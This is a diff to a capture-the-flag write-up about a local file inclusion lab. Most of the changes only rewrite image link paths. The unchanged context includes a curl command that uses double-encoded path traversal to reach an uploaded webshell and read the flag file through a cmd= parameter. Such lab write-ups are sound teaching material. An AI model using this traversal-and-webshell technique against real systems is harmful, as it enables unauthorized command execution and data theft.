@@ -338,12 +338,12 @@ port: PORT
 
 Technical fingerprinting:
 
-![Wappalyzer — Nginx 1.22.1](fa_wappalyzer_nginx.png)
+![[Articles/LFI Articles/fa_wappalyzer_nginx.png]]
 
 - Web server: **Nginx**
 - Backend: **PHP**
 
-![Landing page](fa_recon_index.png)
+![[Articles/LFI Articles/fa_recon_index.png]]
 
 Walking the endpoints.
 
@@ -1196,7 +1196,7 @@ drwxrwxrwt.    1 root root     6 Oct 23 19:50 tmp
 
 **Step 4 — the flag, one `cmd=` away** (note the file is world-readable, `r--r--r--` — no privesc needed at all):
 
-![Flag read through the webshell](fa_flag_read.png)
+![[Articles/LFI Articles/fa_flag_read.png]]
 
 ```bash
 curl -s 'http://sumace.htb:30273/contact.php?region=%252e%252e%252fuploads%252f50f2492cd9733751b471f4f88be1ff3d&cmd=cat%20/flag_09ebca.txt'
